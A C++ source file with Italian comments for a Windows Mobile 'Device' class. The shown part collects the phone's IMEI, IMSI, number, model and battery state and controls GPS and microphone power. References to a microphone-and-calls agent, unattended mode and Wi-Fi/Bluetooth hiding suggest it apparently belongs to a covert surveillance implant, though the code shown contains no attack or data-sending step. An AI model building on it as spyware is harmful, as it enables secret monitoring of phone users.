#include <string>
#include <vector>
#include <exception>

using namespace std;



#include "Device.h"
#include "WiFi.h"
#include "Log.h"
#include <common_new\GetDeviceUniqueId.h>
///#include <common_new\tapi.h>
//#include <common_new\extapi.h>
#include <Winbase.h>
///#include <common_new\simmgr.h>
///#include <common_new\pmpolicy.h>
#include <common_new\regext.h>
///#include <common_new\pwingdi.h>
#include <common_new\Pm.h>

/***
extern "C" {
#include <windbase_edb.h>
}
***/



#include "FunctionFunc.h"

#define CLOSEHANDLE(x) if (x != NULL && x != INVALID_HANDLE_VALUE){ CloseHandle(x); x = NULL; }
#define MAX_EVENT_NOTIFICATION_1  2000

static BOOL bResetStop = FALSE;
static BOOL bStateUnattended = FALSE;

DWORD WINAPI ResetIdle(LPVOID lpParam) {
	Device *deviceObj = Device::self();
	HANDLE closeEvent = (HANDLE)lpParam;
	DWORD dwDelay = INFINITE;

	LOOP {
		if (_WaitForSingleObject(closeEvent, dwDelay) == WAIT_OBJECT_0) {
			if (bResetStop) {
				DBG_TRACE(L"Debug - Device.cpp - ResetIdle() thread closing\n", 1, FALSE);
				return 0;
			}

			_Sleep(500);

			// Cambio del power state
			if (deviceObj->IsDeviceUnattended()) {
	/***
				SystemIdleTimerReset();
	***/
				dwDelay = 30000;
			} else {
				dwDelay = INFINITE;
			}
		}
	}
}

DWORD WINAPI PowerStateNotifier(LPVOID lpParam) {
	Device *deviceObj = Device::self();
	Log logInfo;
	HANDLE hQueue, hIdle;

	DWORD dwRet, dwRead = 0, dwFlags = 0;
	POWER_BROADCAST *powerBroad;
	BYTE bd[sizeof(POWER_BROADCAST) + (MAX_PATH + 1) * sizeof(WCHAR)];

	powerBroad = (POWER_BROADCAST *)bd;
	//SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
	hQueue = (HANDLE)lpParam;
	hIdle = deviceObj->getIdleEvent();

	LOOP {
		dwRet = _WaitForSingleObject(hQueue, INFINITE);

/***
		if (bResetStop) {
			DBG_TRACE(L"Debug - Device.cpp - PowerStateNotifier() thread closing\n", 1, FALSE);
			return 0;
		}

		if (ReadMsgQueue(hQueue, powerBroad, sizeof(bd), &dwRead, 1, &dwFlags)) {
			if (powerBroad->Message & PBT_TRANSITION) {
				switch (powerBroad->Flags) {
					//case POWER_STATE_OFF:
					//	logInfo.WriteLogInfo(L"Power off");
					//	break;

					case POWER_STATE_CRITICAL:
						logInfo.WriteLogInfo(L"Phone is turning off, battery level critical");
						break;

					case POWER_STATE_RESET:
						logInfo.WriteLogInfo(L"Reset");
						break;

					default: break;
				}

				// Avvertiamo il thread che il powerstate e' cambiato
				SetEvent(hIdle);
			}
		}
***/

		// Richiama tutte le callback registrate
		deviceObj->CallRegisteredCallbacks(powerBroad);
	}
}

/**
* La nostra unica reference a Device.
*/
Device* Device::Instance = NULL;
volatile LONG Device::lLock = 0;

Device* Device::self() {
	while (InterlockedExchange((LPLONG)&lLock, 1) != 0)
		_Sleep(1);

	if (Instance == NULL)
		Instance = new(std::nothrow) Device();

	InterlockedExchange((LPLONG)&lLock, 0);

	return Instance;
}

Device::Device() : hDeviceMutex(NULL), dwPhoneState(0), dwRadioState(0), systemPowerStatus(NULL),
hGpsPower(0), hMicPower(0), hDeviceQueue(NULL), hPowerNotification(NULL), iWaveDevRef(0), uMmcNumber(0),
m_WiFiSoundValue(0), m_DataSendSoundValue(0), hNotifyThread(NULL), hResetIdleThread(NULL), hIdleEvent(NULL) {
	MSGQUEUEOPTIONS queue = {0};
	BOOL bPower;

	hDeviceMutex = _CreateMutexW(NULL, FALSE, NULL);

	mDiskInfo.clear();

	strImei.clear();
	strImsi.clear();
	strInstanceId.clear();
	strPhoneNumber.clear();
	strManufacturer.clear();
	strModel.clear();

	hIdleEvent = _CreateEventW(NULL, FALSE, FALSE, NULL);

	hResetIdleThread = _CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(ResetIdle), hIdleEvent, 0, NULL);


	///systemPowerStatus = new(std::nothrow) SYSTEM_POWER_STATUS_EX2;

	systemPowerStatus = new(std::nothrow) SYSTEM_POWER_STATUS;

	if (systemPowerStatus == NULL)
		return;

	ZeroMemory(systemPowerStatus, sizeof(systemPowerStatus));
	
	ulTimeDiff.QuadPart = 0;

/*** BYGIO per adesso non viene gestito	

	bPower = PowerPolicyNotify(PPN_UNATTENDEDMODE, TRUE);

	if (bPower == FALSE)
		return;

	queue.dwFlags = 0;
	queue.dwMaxMessages = 5;
	queue.dwSize = sizeof(MSGQUEUEOPTIONS);
	queue.cbMaxMessage = sizeof(POWER_BROADCAST) + (MAX_PATH + 1) * sizeof(WCHAR);
	queue.bReadAccess = TRUE;

	hDeviceQueue = CreateMsgQueue(NULL, &queue);

	if (hDeviceQueue) {
		hPowerNotification = RequestPowerNotifications(hDeviceQueue, POWER_NOTIFY_ALL);

		if (hPowerNotification) {
			// Non deve mai essere chiuso
			hNotifyThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)(PowerStateNotifier), hDeviceQueue, 0, NULL);
		}
	}
***/
}

Device::~Device() {
	strImei.clear();
	strImsi.clear();
	strInstanceId.clear();
	strPhoneNumber.clear();
	strManufacturer.clear();
	strModel.clear();

	mDiskInfo.clear();

	bResetStop = TRUE;
/***
	if (hNotifyThread != NULL) {
		BYTE pBuf = 0;

		WriteMsgQueue(hDeviceQueue, &pBuf, 1, 10000, 0);

		_WaitForSingleObject(hNotifyThread, INFINITE);
		//TerminateThread(hNotifyThread, 0);
		CloseHandle(hNotifyThread);
	}

	if (hDeviceQueue != NULL)
		CloseMsgQueue(hDeviceQueue);
***/
/***
	if (hGpsPower)
		ReleasePowerRequirement(hGpsPower);
***/
	if (hDeviceMutex != NULL)
		CloseHandle(hDeviceMutex);
/***
	if (hPowerNotification != NULL)
		StopPowerNotifications(hPowerNotification);
***/

	if (hResetIdleThread) {
		SetEvent(hIdleEvent);
		_WaitForSingleObject(hResetIdleThread, INFINITE);
		CloseHandle(hResetIdleThread);
	}
}

BOOL Device::GetOsVersion(OSVERSIONINFO* pVersionInfo) {
	WAIT_AND_SIGNAL(hDeviceMutex);

	_RtlZeroMemory(pVersionInfo, sizeof(OSVERSIONINFO));
	pVersionInfo->dwOSVersionInfoSize = sizeof(OSVERSIONINFO);

	if (_GetVersionExW(pVersionInfo)) {
		UNLOCK(hDeviceMutex);
		return TRUE;
	}

	UNLOCK(hDeviceMutex);
	return FALSE;
}

void Device::GetSystemInfo(SYSTEM_INFO* pSystemInfo) {
	WAIT_AND_SIGNAL(hDeviceMutex);

	_RtlZeroMemory(pSystemInfo, sizeof(SYSTEM_INFO));
	::_GetSystemInfo(pSystemInfo);

	UNLOCK(hDeviceMutex);
	return;
}

void Device::GetMemoryInfo(MEMORYSTATUS* pMemoryInfo) {
	WAIT_AND_SIGNAL(hDeviceMutex);

	_RtlZeroMemory(pMemoryInfo, sizeof(MEMORYSTATUS));
	pMemoryInfo->dwLength = sizeof(MEMORYSTATUS);

	::_GlobalMemoryStatus(pMemoryInfo);

	UNLOCK(hDeviceMutex);
	return;
}


// MANAGEMENT - Viene utilizzato dentro la Start() e Stop() della classe GPS
BOOL Device::SetGpsPowerState() {
/***
	WAIT_AND_SIGNAL(hDeviceMutex);
	DWORD dwDim = 0, dwType = 0, dwIndex = 0;
	HKEY hRes;
	WCHAR wString[100], wGuid[80], wId[10];

	if (hGpsPower) {
		ReleasePowerRequirement(hGpsPower);
		hGpsPower = 0;
	}

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Drivers\\BuiltIn\\GPSID", 0, 0, &hRes) != ERROR_SUCCESS) {
		UNLOCK(hDeviceMutex);
		return FALSE;
	}

	// Prendiamo la GUID
	dwDim = sizeof(wGuid);
	ZeroMemory(wGuid, sizeof(wGuid));
	if (RegQueryValueEx(hRes, L"IClass", NULL, NULL, (PBYTE)wGuid, &dwDim) != ERROR_SUCCESS) {
		wcscpy_s(wGuid, 80, L"{A32942B7-920C-486b-B0E6-92A702A99B35}");
	}

	// Prendiamo l'ID del dispositivo
	dwDim = sizeof(wId);
	ZeroMemory(wId, sizeof(wId));
	if (RegQueryValueEx(hRes, L"Prefix", NULL, NULL, (PBYTE)wId, &dwDim) != ERROR_SUCCESS) {
		wcscpy_s(wId, 10, L"GPD");
	}

	// Prendiamo l'Index dell'id
	dwDim = 4;
	if (RegQueryValueEx(hRes, L"Index", NULL, &dwType, (PBYTE)&dwIndex, &dwDim) != ERROR_SUCCESS) {
		dwIndex = 0;
	}

	RegCloseKey(hRes);

	_snwprintf(wString, 100, L"%s\\%s%d:", wGuid, wId, dwIndex);

	hGpsPower = SetPowerRequirement(wString, D0, POWER_NAME | POWER_FORCE, NULL, 0);

	if (hGpsPower == 0) {
		_snwprintf(wString, 100, L"%s\\%s%d:", L"{A32942B7-920C-486b-B0E6-92A702A99B35}", wId, dwIndex);
		hGpsPower = SetPowerRequirement(wString, D0, POWER_NAME | POWER_FORCE, NULL, 0);

		if (hGpsPower == 0) {
			UNLOCK(hDeviceMutex);
			return FALSE;
		}
	}

	UNLOCK(hDeviceMutex);
***/
	return TRUE;
}

BOOL Device::ReleaseGpsPowerState() {
/***
	WAIT_AND_SIGNAL(hDeviceMutex);

	DWORD dwRet;

	if (hGpsPower == 0) {
		UNLOCK(hDeviceMutex);
		return FALSE;
	}

	dwRet =	ReleasePowerRequirement(hGpsPower);

	if (dwRet == ERROR_SUCCESS) {
		hGpsPower = 0;
		UNLOCK(hDeviceMutex);
		return TRUE;
	}

	UNLOCK(hDeviceMutex);
***/
	return FALSE;
}

// Viene utilizzato sia dall'agente microfono che chiamate
BOOL Device::SetMicPowerState() {
/***
	WAIT_AND_SIGNAL(hDeviceMutex);
	DWORD dwDim = 0, dwType = 0, dwIndex = 0;
	HKEY hRes;
	WCHAR wString[100], wGuid[80], wId[10];

	iWaveDevRef++;

	if (hMicPower) {
		UNLOCK(hDeviceMutex);
		return TRUE;
	}

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Drivers\\BuiltIn\\WaveDev", 0, 0, &hRes) != ERROR_SUCCESS) {
		UNLOCK(hDeviceMutex);
		return FALSE;
	}

	// Prendiamo la GUID
	dwDim = sizeof(wGuid);
	ZeroMemory(wGuid, sizeof(wGuid));
	if (RegQueryValueEx(hRes, L"IClass", NULL, NULL, (PBYTE)wGuid, &dwDim) != ERROR_SUCCESS) {
		wcscpy_s(wGuid, 80, L"{A32942B7-920C-486b-B0E6-92A702A99B35}");
	}

	// Prendiamo l'ID del dispositivo
	dwDim = sizeof(wId);
	ZeroMemory(wId, sizeof(wId));
	if (RegQueryValueEx(hRes, L"Prefix", NULL, NULL, (PBYTE)wId, &dwDim) != ERROR_SUCCESS) {
		wcscpy_s(wId, 10, L"WAV");
	}

	// Prendiamo l'Index dell'id
	dwDim = 4;
	if (RegQueryValueEx(hRes, L"Index", NULL, &dwType, (PBYTE)&dwIndex, &dwDim) != ERROR_SUCCESS) {
		dwIndex = 0;
	}

	RegCloseKey(hRes);

	_snwprintf(wString, 100, L"%s\\%s%d:", wGuid, wId, dwIndex);

	hMicPower = SetPowerRequirement(wString, D0, POWER_NAME | POWER_FORCE, NULL, 0);

	if (hMicPower == 0) {
		_snwprintf(wString, 100, L"%s\\%s%d:", L"{A32942B7-920C-486b-B0E6-92A702A99B35}", wId, dwIndex);
		hMicPower = SetPowerRequirement(wString, D0, POWER_NAME | POWER_FORCE, NULL, 0);

		if (hMicPower == 0) {
			UNLOCK(hDeviceMutex);
			return FALSE;
		}
	}

	UNLOCK(hDeviceMutex);
***/
	return TRUE;
}

BOOL Device::ReleaseMicPowerState() {
/***
	WAIT_AND_SIGNAL(hDeviceMutex);
	DWORD dwRet;

	if (iWaveDevRef == 0) {
		UNLOCK(hDeviceMutex);
		return FALSE;
	}

	iWaveDevRef--;

	if (iWaveDevRef > 0) {
		UNLOCK(hDeviceMutex);
		return TRUE;
	}

	if (hMicPower == 0) {
		UNLOCK(hDeviceMutex);
		return FALSE;
	}

	dwRet =	ReleasePowerRequirement(hMicPower);

	if (dwRet == ERROR_SUCCESS) {
		hMicPower = 0;
		UNLOCK(hDeviceMutex);
		return TRUE;
	}

	UNLOCK(hDeviceMutex);
***/
	return FALSE;
}

CEDEVICE_POWER_STATE Device::GetFrontLightPowerState() {
/***
	WAIT_AND_SIGNAL(hDeviceMutex);
	DWORD dwDim = 0, dwType = 0, dwIndex = 0;
	HKEY hRes;
	WCHAR wString[100], wGuid[80], wId[10];
	CEDEVICE_POWER_STATE powerState = D0;

	if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Drivers\\BuiltIn\\FrontLight", 0, 0, &hRes) != ERROR_SUCCESS) {
		if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, L"Drivers\\BuiltIn\\BackLight", 0, 0, &hRes) != ERROR_SUCCESS)
			return D0;
	}

	// Prendiamo la GUID
	dwDim = sizeof(wGuid);
	ZeroMemory(wGuid, sizeof(wGuid));
	if (RegQueryValueEx(hRes, L"IClass", NULL, NULL, (PBYTE)wGuid, &dwDim) != ERROR_SUCCESS) {
		wcscpy_s(wGuid, 80, L"{A32942B7-920C-486b-B0E6-92A702A99B35}");
	}

	// Prendiamo l'ID del dispositivo
	dwDim = sizeof(wId);
	ZeroMemory(wId, sizeof(wId));
	if (RegQueryValueEx(hRes, L"Prefix", NULL, NULL, (PBYTE)wId, &dwDim) != ERROR_SUCCESS) {
		wcscpy_s(wId, 10, L"BKL");
	}

	// Prendiamo l'Index dell'id
	dwDim = 4;
	if (RegQueryValueEx(hRes, L"Index", NULL, &dwType, (PBYTE)&dwIndex, &dwDim) != ERROR_SUCCESS) {
		dwIndex = 0;
	}

	RegCloseKey(hRes);

	// Per prima cosa, proviamo ad ottenere uno stato chiedendolo direttamente al driver
	_snwprintf(wString, 100, L"%s%d:", wId, dwIndex);

	wstring strString = wString;
	powerState = NCGetDevicePowerState(strString);

	if (powerState != PwrDeviceUnspecified) {
		UNLOCK(hDeviceMutex);
		return powerState;
	}

	_snwprintf(wString, 100, L"%s\\%s%d:", wGuid, wId, dwIndex);
	strString = wString;

	powerState = NCGetDevicePowerState(strString);

	if (powerState == PwrDeviceUnspecified) {
		_snwprintf(wString, 100, L"%s\\%s%d:", L"{A32942B7-920C-486b-B0E6-92A702A99B35}", wId, dwIndex);
		strString = wString;

		powerState = NCGetDevicePowerState(strString);

		if (powerState == PwrDeviceUnspecified) {
			UNLOCK(hDeviceMutex);
			return D0;
		}
	}

	UNLOCK(hDeviceMutex);
	return powerState;
***/
	CEDEVICE_POWER_STATE powerState = D0;
	return powerState;
}

CEDEVICE_POWER_STATE Device::NCGetDevicePowerState(const wstring &strDevice) {
/***
	CEDEVICE_POWER_STATE powerState = PwrDeviceUnspecified;
	wstring strDeviceName;

	if (strDevice.size() == 0) {
		DBG_TRACE(L"Debug - Device.cpp - NCGetDevicePowerState() FAILED [0]\n", 4, FALSE);
		return PwrDeviceUnspecified;
	}

	

	strDeviceName = strDevice;

	// Vediamo se il nome e' nel formato {GUID}\DeviceX:
	size_t trailingSlash = strDeviceName.find(L"}\\");

	if (trailingSlash != wstring::npos && strDeviceName.size() > 2) {
		strDeviceName = strDeviceName.substr(trailingSlash + 2, strDeviceName.size());
	}

	HANDLE hDev = _CreateFileW(strDeviceName.c_str(), GENERIC_READ | GENERIC_WRITE, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, NULL);

	if (hDev == INVALID_HANDLE_VALUE) {
		if (trailingSlash && GetDevicePower((WCHAR *)strDevice.c_str(), POWER_NAME | POWER_FORCE, &powerState) == ERROR_SUCCESS)
			return powerState;

		return PwrDeviceUnspecified;
	}

	DWORD bytesOut = 0;

	BOOL bRes = _DeviceIoControl(hDev, IOCTL_POWER_GET, NULL, sizeof(POWER_RELATIONSHIP), &powerState,
		sizeof(powerState), &bytesOut, NULL);

	CloseHandle(hDev);

	if (bRes)	
		return powerState;

	if (trailingSlash && GetDevicePower((WCHAR *)strDevice.c_str(), POWER_NAME, &powerState) == ERROR_SUCCESS)
		return powerState;

	DBG_TRACE(L"Debug - Device.cpp - NCGetDevicePowerState() FAILED [1] ", 4, TRUE);
	return PwrDeviceUnspecified;
	***/
	CEDEVICE_POWER_STATE powerState = PwrDeviceUnspecified;
	return powerState;
}

BOOL Device::NCSetDevicePowerState(const wstring &strDevice, CEDEVICE_POWER_STATE cePowerState) {
/***
	CEDEVICE_POWER_STATE powerState = PwrDeviceUnspecified;
	wstring strDeviceName;

	if (strDevice.size() == 0) {
		DBG_TRACE(L"Debug - Device.cpp - NCSetDevicePowerState() FAILED [0]\n", 4, FALSE);
		return FALSE;
	}

	strDeviceName = strDevice;

	// Vediamo se il nome e' nel formato {GUID}\DeviceX:
	size_t trailingSlash = strDeviceName.find(L"}\\");

	if (trailingSlash != wstring::npos && strDeviceName.size() > 2) {
		strDeviceName = strDeviceName.substr(trailingSlash + 2, strDeviceName.size());
	}

	HANDLE hDev = _CreateFileW(strDeviceName.c_str(), GENERIC_READ | GENERIC_WRITE, 
		FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_ALWAYS, 0, NULL);

	if (hDev == INVALID_HANDLE_VALUE) {
		DBG_TRACE(L"Debug - Device.cpp - CreateFile() FAILED [1] ", 4, TRUE);

		if (trailingSlash && SetDevicePower((WCHAR *)strDevice.c_str(), POWER_NAME | POWER_FORCE, cePowerState) == ERROR_SUCCESS)
			return TRUE;

		DBG_TRACE(L"Debug - Device.cpp - NCSetDevicePowerState() FAILED [2] ", 4, TRUE);
		return FALSE;
	}

	DWORD bytesOut = 0;

	BOOL bRes = _DeviceIoControl(hDev, IOCTL_POWER_SET, NULL, 0, &cePowerState, sizeof(cePowerState), &bytesOut, NULL);

	CloseHandle(hDev);

	if (bRes)
		return TRUE;

	if (trailingSlash && SetDevicePower((WCHAR *)strDevice.c_str(), POWER_NAME, cePowerState) == ERROR_SUCCESS)
		return TRUE;

	DBG_TRACE(L"Debug - Device.cpp - NCSetDevicePowerState() FAILED [3] ", 4, TRUE);
**/
	return FALSE;
}

CEDEVICE_POWER_STATE Device::GetDevicePowerState(const wstring &pwDevice) {
	WAIT_AND_SIGNAL(hDeviceMutex);
	CEDEVICE_POWER_STATE powerState;

	powerState = NCGetDevicePowerState(pwDevice);

	UNLOCK(hDeviceMutex);
	return powerState;
}

BOOL Device::SetDevicePowerState(const wstring &pwDevice, CEDEVICE_POWER_STATE cePowerState) {
	WAIT_AND_SIGNAL(hDeviceMutex);
	BOOL bRes;

	bRes = NCSetDevicePowerState(pwDevice, cePowerState);

	UNLOCK(hDeviceMutex);
	return bRes;
}

DWORD Device::GetMobileCountryCode() {
	WAIT_AND_SIGNAL(hDeviceMutex);
	DWORD dwMCC;
	WCHAR wMCC[5];

	if (strImsi.size() < 15) {
		UNLOCK(hDeviceMutex);
		return 0;
	}

	// I primi tre caratteri dell'IMSI sono il MCC
	_RtlZeroMemory(&wMCC, sizeof(wMCC));
	strImsi._Copy_s(wMCC, 4, 3, 0);
	dwMCC = (DWORD)_wtoi(wMCC);

	UNLOCK(hDeviceMutex);
	return dwMCC;
}

DWORD Device::GetMobileNetworkCode() {
	WAIT_AND_SIGNAL(hDeviceMutex);
	DWORD dwMNC;
	WCHAR wMNC[5];

	if (strImsi.size() < 15) {
		UNLOCK(hDeviceMutex);
		return 0;
	}

	// Il quarto e quinto carattere dell'IMSI e' il MNC
	_RtlZeroMemory(&wMNC, sizeof(wMNC));
	strImsi._Copy_s(wMNC, 4, 2, 3);
	dwMNC = (DWORD)_wtoi(wMNC);

	UNLOCK(hDeviceMutex);
	return dwMNC;
}

BOOL Device::IsWiFiHidingSupported() {
	throw "Not yet implemented";
}

void Device::IsBTHidingSupported() {
	throw "Not yet implemented";
}

BOOL Device::IsWifi() {
	throw "Not yet implemented";
}

BOOL Device::IsBT() {
	throw "Not yet implemented";
}

BOOL Device::IsWiFiActivable() {
	throw "Not yet implemented";
}

BOOL Device::IsBTActivable() {
	throw "Not yet implemented";
}

const wstring Device::GetImsi() {
	return strImsi;
}

const wstring Device::GetImei() {
	return strImei;
}

const BYTE* Device::GetInstanceId() {
	return g_InstanceId;
}

const wstring Device::GetPhoneNumber() {
	return strPhoneNumber;
}

const wstring Device::GetManufacturer() {
	return strManufacturer;
}

const wstring Device::GetModel() {
	return strModel;
}

///const SYSTEM_POWER_STATUS_EX2* Device::GetBatteryStatus() {
const SYSTEM_POWER_STATUS* Device::GetBatteryStatus() {
	return systemPowerStatus;
}

UINT Device::GetDiskNumber() {
	return uMmcNumber;
}

BOOL Device::GetDiskInfo(UINT uIndex, wstring &strName, 
						 PULARGE_INTEGER plFtc, PULARGE_INTEGER plDsk, PULARGE_INTEGER plDf) {
							 WAIT_AND_SIGNAL(hDeviceMutex);

							 if (uIndex > mDiskInfo.size() || plFtc == NULL || plDsk == NULL || plDf == NULL) {
								 UNLOCK(hDeviceMutex);
								 return FALSE;
							 }

							 strName = mDiskInfo[uIndex].strDiskName;
							 *plFtc = mDiskInfo[uIndex].lFreeToCaller;
							 *plDsk = mDiskInfo[uIndex].lDiskSpace;
							 *plDf = mDiskInfo[uIndex].lDiskFree;

							 UNLOCK(hDeviceMutex);
							 return TRUE;
}

BOOL Device::IsGsmEnabled() {
/***
	if (dwRadioState == LINERADIOSUPPORT_ON)
		return TRUE;
***/
	return FALSE;
}

BOOL Device::IsSimEnabled() {
/***
	WAIT_AND_SIGNAL(hDeviceMutex);

	HSIM hSim;
	HRESULT hSimCheck;
	SIMCAPS sCaps;

	// Vediamo se c'e' una SIM inserita
	hSimCheck = SimInitialize(0, NULL, NULL, &hSim);

	if (hSimCheck != S_OK) {
		UNLOCK(hDeviceMutex);
		return FALSE;
	}

	if (SimGetDevCaps(hSim, SIM_CAPSTYPE_PBENTRYLENGTH, &sCaps) != S_OK) {
		SimDeinitialize(hSim);
		UNLOCK(hDeviceMutex);
		return FALSE;
	}

	SimDeinitialize(hSim);
	UNLOCK(hDeviceMutex);
***/
	return TRUE;
}

BOOL Device::RefreshBatteryStatus() {
	
	WAIT_AND_SIGNAL(hDeviceMutex);

	BOOL bRet;

	// Otteniamo le info dalla batteria (aggiorniamo lo stato di systemPowerStatus)
	///bRet = GetSystemPowerStatusEx2(systemPowerStatus, sizeof(SYSTEM_POWER_STATUS_EX2), TRUE) ? TRUE : FALSE;
	bRet = _GetSystemPowerStatus(systemPowerStatus) ? TRUE : FALSE;
	UNLOCK(hDeviceMutex);
	return bRet;
	
	return NULL;
}

BOOL Device::RefreshData() {

	LINEGENERALINFO LineGeneralInfo;

	HLINE hLine = NULL;
	HLINEAPP hApp = NULL;
/***	
	LINEADDRESSCAPS AddressCaps;
	LINEINITIALIZEEXPARAMS liep;
	DWORD dwPhoneNumDevs = 0, dwApiVersion = TAPI_CURRENT_VERSION;
	DWORD dwMinVersion = 0x00010003;
	UINT uMmc, i;
	WIN32_FIND_DATA wfd;
	HANDLE hMmc = INVALID_HANDLE_VALUE;
	map<UINT, DiskStruct>::iterator flashIter;

	WAIT_AND_SIGNAL(hDeviceMutex);

	ZeroMemory(&wfd, sizeof(wfd));
***/
	// Otteniamo le info dalla batteria (aggiorniamo lo stato di systemPowerStatus)
	///GetSystemPowerStatusEx2(systemPowerStatus, sizeof(SYSTEM_POWER_STATUS_EX2), TRUE);
	_GetSystemPowerStatus(systemPowerStatus);

/***
	do {
		ZeroMemory(&liep, sizeof(liep));
		liep.dwTotalSize = sizeof(LINEINITIALIZEEXPARAMS);
		liep.dwOptions   = LINEINITIALIZEEXOPTION_USEEVENT;

		// Inizializziamo le TAPI
		if (lineInitializeEx(&hApp, 0, NULL, TEXT("ExTapi_Lib"), &dwPhoneNumDevs, &dwApiVersion, &liep)) 
			break;

		// Negoziamo una versione minima
		for(i = 0; i < dwPhoneNumDevs; i++) {
			LINEEXTENSIONID extensionID;
			ZeroMemory(&extensionID, sizeof(LINEEXTENSIONID));
			lineNegotiateAPIVersion(hApp, i, 0x00010003, TAPI_CURRENT_VERSION, &dwApiVersion, &extensionID);
		}

		if (lineOpen(hApp, 0, &hLine, dwApiVersion, 0, 0, LINECALLPRIVILEGE_NONE, 0, NULL) < 0) {
			lineShutdown(hApp);
			break;
		}

		if (lineGetEquipmentState(hLine, &dwPhoneState, &dwRadioState) < 0) {
			lineClose(hLine);
			lineShutdown(hApp);
			break;
		}

***/		
		ZeroMemory(&LineGeneralInfo, sizeof(LineGeneralInfo));
		LineGeneralInfo.dwTotalSize = sizeof(LineGeneralInfo);
/**
		if (lineGetGeneralInfo(hLine, &LineGeneralInfo) < 0){
			lineClose(hLine);
			lineShutdown(hApp);
			break;
		}
***/
		// Prendiamo il codice IMEI
		LINEGENERALINFO *lpBuffer = (LINEGENERALINFO *)new(std::nothrow) BYTE[LineGeneralInfo.dwNeededSize];
/***
		if (lpBuffer == NULL) {Device::RefreshData() {
			lineClose(hLine);
			lineShutdown(hApp);
			break;
		}
***/
		ZeroMemory(lpBuffer, LineGeneralInfo.dwNeededSize);
		lpBuffer->dwTotalSize = LineGeneralInfo.dwNeededSize;
/***
		if (lineGetGeneralInfo(hLine, lpBuffer) < 0) {
			delete[] lpBuffer;
			lineClose(hLine);
			lineShutdown(hApp);
			break;
		}
***/
		wstring strWrongImei;
		strImei.clear();
/***
		if (lpBuffer->dwSerialNumberSize) {
			PBYTE pSerial = (BYTE *)lpBuffer + (lpBuffer->dwSerialNumberOffset);
			strImei = (PWCHAR)pSerial;

			// Da utilizzare solo per il calcolo dell'instance (perche' questo calcolo NON e' corretto!)
			strWrongImei.assign((WCHAR *)pSerial, lpBuffer->dwSerialNumberSize / sizeof(WCHAR));
		}
***/
		// Calcoliamo l'InstanceId (g_InstanceId contiene i raw bytes non la stringa ASCII dell'ID)
		BYTE *pImei = (BYTE *)strImei.c_str();
		DWORD cbLen = 20;
		ZeroMemory(g_InstanceId, 20);
		///_GetDeviceUniqueID(pImei, strWrongImei.size() * sizeof(WCHAR), GETDEVICEUNIQUEID_V1, g_InstanceId, &cbLen);

		
		// Originale
	    g_InstanceId[0]=0x58;g_InstanceId[1]=0x1b;g_InstanceId[2]=0x5a;g_InstanceId[3]=0xb3;g_InstanceId[4]=0xd6;g_InstanceId[5]=0xb3;g_InstanceId[6]=0xea;g_InstanceId[7]=0xdf;g_InstanceId[8]=0x10;g_InstanceId[9]=0xbf;
		g_InstanceId[10]=0xa4;g_InstanceId[11]=0xcb;g_InstanceId[12]=0x98;g_InstanceId[13]=0x1d;g_InstanceId[14]=0x50;g_InstanceId[15]=0x78;g_InstanceId[16]=0x44;g_InstanceId[17]=0x06;g_InstanceId[18]=0xd3;g_InstanceId[19]=0x0a;
		
		/*
	    g_InstanceId[0]=0x59;g_InstanceId[1]=0x1b;g_InstanceId[2]=0x5a;g_InstanceId[3]=0xb3;g_InstanceId[4]=0xd6;g_InstanceId[5]=0xb3;g_InstanceId[6]=0xea;g_InstanceId[7]=0xdf;g_InstanceId[8]=0x10;g_InstanceId[9]=0xbf;
		g_InstanceId[10]=0xa4;g_InstanceId[11]=0xcb;g_InstanceId[12]=0x98;g_InstanceId[13]=0x1d;g_InstanceId[14]=0x50;g_InstanceId[15]=0x78;g_InstanceId[16]=0x44;g_InstanceId[17]=0x06;g_InstanceId[18]=0xd3;g_InstanceId[19]=0x0a;
		*/


/***
		// Richiediamo il numero di telefono
		ZeroMemory(&AddressCaps, sizeof(AddressCaps));
		AddressCaps.dwTotalSize = sizeof(AddressCaps);

		if (lineGetAddressCaps(hApp, 0, 0, dwApiVersion, 0, &AddressCaps) < 0) {
			delete[] lpBuffer;
			lineClose(hLine);
			lineShutdown(hApp);
			break;
		}

		LINEADDRESSCAPS *lpLine = (LINEADDRESSCAPS *)new(std::nothrow) BYTE[AddressCaps.dwNeededSize];

		if (lpLine == NULL) {
			delete[] lpBuffer;
			lineClose(hLine);
			lineShutdown(hApp);
			break;
		}

		ZeroMemory(lpLine, AddressCaps.dwNeededSize);
		lpLine->dwTotalSize = AddressCaps.dwNeededSize;

		if (lineGetAddressCaps(hApp, 0, 0, dwApiVersion, 0, lpLine) < 0) {
			delete[] lpBuffer;
			delete[] lpLine;
			lineClose(hLine);
			lineShutdown(hApp);
			break;
		}

		lineClose(hLine);
		lineShutdown(hApp);
***/
		strManufacturer.clear();

		WCHAR stringBuilder[128];
		WCHAR stringBuilder1[64];
		WCHAR stringBuilder2[64];
		DWORD ret;

		
		/*****
		if (lpBuffer->dwManufacturerSize) {
			PBYTE pManuf = (BYTE *)lpBuffer + (lpBuffer->dwManufacturerOffset);

			strManufacturer = (PWCHAR)pManuf;
		}
		*****/
		_QueryPhoneInformation(0,stringBuilder1,sizeof(stringBuilder1)/sizeof(WCHAR),&ret);
		strManufacturer=stringBuilder1;



		// Prendiamo il nome del modello
		strModel.clear();
		/*****
		if (lpBuffer->dwModelSize) {
			PBYTE pModel = (BYTE *)lpBuffer + (lpBuffer->dwModelOffset);

			strModel = (PWCHAR)pModel;
		}
		*****/
		_QueryPhoneInformation(4,stringBuilder1,sizeof(stringBuilder1)/sizeof(WCHAR),&ret);
		_QueryPhoneInformation(8,stringBuilder2,sizeof(stringBuilder2)/sizeof(WCHAR),&ret);
		swprintf_s(stringBuilder, TEXT("%s - %s\n"),stringBuilder1,stringBuilder2);
		strModel=stringBuilder;

/***
		// Il supporto radio GSM e' spento
		if (dwRadioState == LINERADIOSUPPORT_OFF) {
			delete[] lpBuffer;
			delete[] lpLine;
			break;
		}

		// Prendiamo il numero della linea
		strImsi.clear();

		if (lpBuffer->dwSubscriberNumberSize) {
			PBYTE pImsi = (BYTE *)lpBuffer + (lpBuffer->dwSubscriberNumberOffset);

